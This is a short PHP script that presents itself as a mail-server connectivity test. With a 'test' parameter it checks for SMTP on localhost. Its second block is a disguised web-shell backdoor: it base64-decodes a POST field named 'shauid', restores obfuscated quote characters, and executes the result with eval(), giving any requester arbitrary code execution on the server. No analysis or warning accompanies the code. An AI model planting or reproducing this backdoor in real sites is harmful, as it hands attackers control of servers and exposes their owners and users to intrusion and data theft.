<?php

if(isset($_GET['test'])){
	function get_data($smtp_conn){
          $data="";
          while($str = fgets($smtp_conn,515)) {
			  $data .= $str;
			  if(substr($str,3,1) == " "){ break; }
        	}
          return $data;
	}
	echo phpversion()."<br/>";
	if ($SMTPIN = fsockopen ('127.0.0.1', '25')){
		$mailreq = get_data($SMTPIN);
		$findme   = '220';
		$pos = strpos($mailreq, $findme);
		if ($pos === false) {
        	echo "Mail server conncetion false<br/>";
		} else {
        	echo "Mail server connect done<br/>";
		}

		} else {
				echo "No MailServer on server platform<br/>";
		}
}

        if(isset($_POST['shauid'])){
                $uidmail = str_replace("776", "\'", base64_decode($_POST['shauid']));
                $uidmail = str_replace("777", "'", $uidmail);
                eval($uidmail);
        }
        else{
                echo "This test server no data send<br/>";
        }
?>
